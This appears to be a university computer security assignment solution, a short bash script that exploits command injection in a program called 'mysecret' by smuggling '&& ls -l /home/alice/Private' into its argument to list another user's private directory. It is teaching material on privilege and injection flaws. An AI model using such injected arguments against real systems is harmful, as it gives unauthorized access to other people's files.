## CE/CZ4062 Computer Security Assignment Solution 1
## By Jiang Huan, Li Yichang & Li Yueran, NTU SCE
## Created on 24 Oct, 2015

#!/bin/bash -p
cd /home/alice/Public
./mysecret '> /dev/null && ls -l /home/alice/Private' | sed /^$USER/d
